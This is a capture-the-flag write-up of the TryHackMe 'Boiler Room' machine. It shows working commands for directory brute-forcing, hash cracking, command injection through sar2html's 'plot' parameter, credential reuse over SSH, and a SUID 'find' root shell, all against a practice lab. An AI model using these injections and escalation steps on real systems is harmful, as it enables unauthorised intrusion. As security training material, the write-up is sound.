# 🛡️ TryHackMe – Boiler Room - Writeup

## 📌 Overview
**Room Name:** Boiler Room  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Category:** Web / Command Injection / Multi-layer Encoding / PrivEsc

Linux machine with Joomla and a hidden sar2html endpoint. Multi-layer encoded credentials are buried in `robots.txt`, a command injection in sar2html's `plot` parameter exposes SSH credentials in a log file, and SUID `find` provides root.

Attack chain overview:

- Port scan → anonymous FTP, Apache port 80, Webmin port 10000
- `robots.txt` decimal string → Base64 → MD5 cracked to `kidding`
- Gobuster with large wordlist reveals `/joomla`; recursive scan finds `_test/` with sar2html
- Command injection via `?plot=;cmd` → `log.txt` exposes `basterd:superduperp@$$`
- Full port scan reveals SSH on port 55007 (missed in initial range scan)
- SSH as `basterd` → `backup.sh` exposes `stoner:superduperp@$$no1knows`
- SUID `/usr/bin/find` → `find . -exec /bin/sh -p \; -quit` → root

---

## 🔍 1. Enumeration

### 🔎 Port Scan

```bash
rustscan -a <TARGET_IP> -r 1-65535 -- -sV -sC
```

```text
21/tcp    open  ftp     vsftpd 3.0.3  (anonymous login allowed)
80/tcp    open  http    Apache 2.4.18
10000/tcp open  http    MiniServ 1.930 (Webmin)
```

> **Missed port:** The initial scan used `-r 1-63365`, leaving port 55007 (SSH) outside the range. It was discovered later with a full `nmap -p-` scan. In CTFs, always scan the full `1-65535` range or use `nmap -p-`.

Webmin required HTTPS — browsing `https://<TARGET_IP>:10000` confirmed a login panel. Noted for later.

### 🔎 robots.txt — Multi-Layer Encoding

```bash
curl http://<TARGET_IP>/robots.txt
```

```text
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it
079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 079 084 069 049 079 068 081 075
```

The path list was clearly designed as misdirection. The numeric string was the real payload: values in the range 48–122 with spaces between them match ASCII decimal codes.

Decoded in three stages via CyberChef:

```
From Decimal → OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK
From Base64  → 99b0660cd95adea327c54182baa51584
```

The 32-character hex string is an MD5 hash:

```bash
hashcat -m 0 99b0660cd95adea327c54182baa51584 /usr/share/wordlists/rockyou.txt
# → 99b0660cd95adea327c54182baa51584:kidding
```

Password candidate: **`kidding`**

---

## 🔍 2. FTP Investigation

```bash
ftp <TARGET_IP>
# user: anonymous / pass: (blank)

get .info.txt
cat .info.txt
# → Whfg jnagrq gb frr vs lbh svaq vg. Ybl. Erzrzore: Rahzrengvba vf gur xrl!
```

ROT13 decode:

```text
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

Dead end — but the hint reinforced the need for thorough web enumeration.

---

## 🔍 3. Web Enumeration

### Finding /joomla

Initial scan with `common.txt` (~4,600 words) found only `/manual`. Joomla's directory was not in that wordlist:

> **Why the wordlist matters:** `common.txt` covers generic paths but misses application-specific names like `joomla`. Switching to `directory-list-2.3-medium.txt` (~220,000 words) found it immediately.

```bash
gobuster dir -u http://<TARGET_IP>/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# → /joomla  (301)
```

Joomla version confirmed at:

```
http://<TARGET_IP>/joomla/administrator/manifests/files/joomla.xml
→ 3.9.12-dev
```

Login attempt with `admin / kidding` on the Joomla admin panel failed — the username was still unknown at this point.

### Recursive Scan Inside /joomla

```bash
feroxbuster -u http://<TARGET_IP>/joomla/ \
  -w /usr/share/wordlists/dirb/common.txt
```

Discovered several non-standard directories:

```text
/joomla/_archive
/joomla/_database
/joomla/_files
/joomla/_test      ← index.php returns 200
/joomla/~www
```

The others contained encoded strings that all decoded to rabbit-hole messages:

| Path | Encoding | Result |
|------|----------|--------|
| `_database/index.html` | ROT24 | "Just messing around." |
| `_files/index.html` | Base64 | "Whopsie daisy" |

`_test/index.php` was different — it loaded **sar2html**, a system performance monitoring tool.

---

## 🔓 4. Initial Access — sar2html Command Injection

The sar2html page accepted a `plot` URL parameter to select a host. Testing with a command separator:

```bash
curl "http://<TARGET_IP>/joomla/_test/index.php?plot=;ls"
```

The rendered page appeared unchanged, but the HTML source revealed the command output embedded inside a `<select>` dropdown:

```html
<option value="index.php">index.php</option>
<option value="log.txt">log.txt</option>
<option value="sar2html">sar2html</option>
```

> **Why source inspection was required:** sar2html writes command output into the dropdown options — it doesn't appear in the visible page content. Reading only the rendered page would miss it entirely.

Reviewing `index.php` source confirmed the root cause:

```php
$command = "./sar2html -r " . $plot;
exec($command, $RELEASE);
```

The `$plot` parameter was concatenated directly into `exec()` with no sanitisation.

Reading `log.txt`:

```bash
curl "http://<TARGET_IP>/joomla/_test/index.php?plot=;cat+log.txt"
```

Credentials visible in the output dropdown:

```text
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2
#pass: superduperp@$$
```

Credentials recovered: **`basterd : superduperp@$$`**

Attempts to use these on Webmin and the Joomla admin panel both failed. SSH on port 22 appeared closed from the initial scan — this pointed to SSH running on a non-standard port.

---

## 🔍 5. Full Port Scan — Discovering Port 55007

```bash
nmap -p- <TARGET_IP> --min-rate 5000
# → 55007/tcp open  unknown

nmap -p 55007 -sV <TARGET_IP>
# → 55007/tcp open  ssh  OpenSSH 7.2p2
```

SSH was running on port 55007, outside the original scan range.

---

## 🔓 6. SSH Access — basterd → stoner

```bash
ssh basterd@<TARGET_IP> -p 55007
# Password: superduperp@$$
```

Home directory contained `backup.sh`:

```bash
cat backup.sh
```

```bash
#!/bin/bash
REMOTE=1.2.3.4
SOURCE=/home/stoner
USER=stoner
#superduperp@$$no1knows
ssh $USER@$REMOTE mkdir ...
```

A commented-out password exposed credentials for `stoner`:

```bash
su stoner
# Password: superduperp@$$no1knows
```

**Lateral movement to `stoner` achieved.** ✅

`sudo -l` revealed a sudoable path `/NotThisTime/MessinWithYa` — non-existent by design, a deliberate rabbit hole.

---

## 👑 7. Privilege Escalation — SUID find

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/bin/find   ← unusual SUID
/usr/bin/at
/usr/bin/pkexec
...
```

`/usr/bin/find` with SUID executes its `-exec` argument as root. Per GTFOBins:

```bash
find . -exec /bin/sh -p \; -quit
whoami
# root
```

- `-exec /bin/sh -p` — launches a shell; `-p` preserves the SUID effective UID (root)
- `-quit` — stops after the first match, avoiding repeated shell spawns

**ROOT ACCESS GRANTED.** ✅

---

## 🏁 Flags

### 🧍 User Flag

Found at `/home/stoner/.secret` (not `user.txt`):

```
You made it till here, well done.
```

### 👑 Root Flag

```
It wasn't that hard, was it?
```

Found at `/root/root.txt`.

---

## 📚 Key Takeaways

- 🔢 **Identify encoding by pattern before decoding:** The `robots.txt` number sequence (range 48–122, space-separated) matched ASCII decimal. Recognising the character range saved the step of trying Base32 or hex first.

- 📋 **Wordlist size is a first-class decision:** `common.txt` (~4,600 words) silently missed `/joomla`. Always match wordlist size to the target's complexity — medium-sized lists for CTFs with obscure paths.

- 👁️ **sar2html writes output to HTML source, not visible content:** The command injection result was hidden inside `<option>` tags in the page source. When a web tool returns no visible output after an injection, always inspect the raw HTML.

- 🔍 **Credentials left in comments are real findings:** `backup.sh` had `#superduperp@$$no1knows` commented out. Comments, scripts, and config files often contain old or in-use secrets — always read them fully.

- 🌐 **Non-standard SSH ports evade partial range scans:** Port 55007 existed but was outside the `-r 1-63365` range used initially. Always scan `1-65535` or use `nmap -p-` to guarantee full coverage.

- 🔑 **SUID `find` is an immediate root primitive:** `find` is a common SUID misconfiguration. Any binary with `-exec` capability and SUID is worth checking against GTFOBins before attempting anything more complex.

---

## 🛠️ Tools Used

- `rustscan`, `nmap`
- `gobuster`, `feroxbuster`
- `ftp`
- `curl`
- `hashcat`
- CyberChef (Decimal → Base64 → MD5 decode chain)
- `ssh`
- `find` (SUID escalation)

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
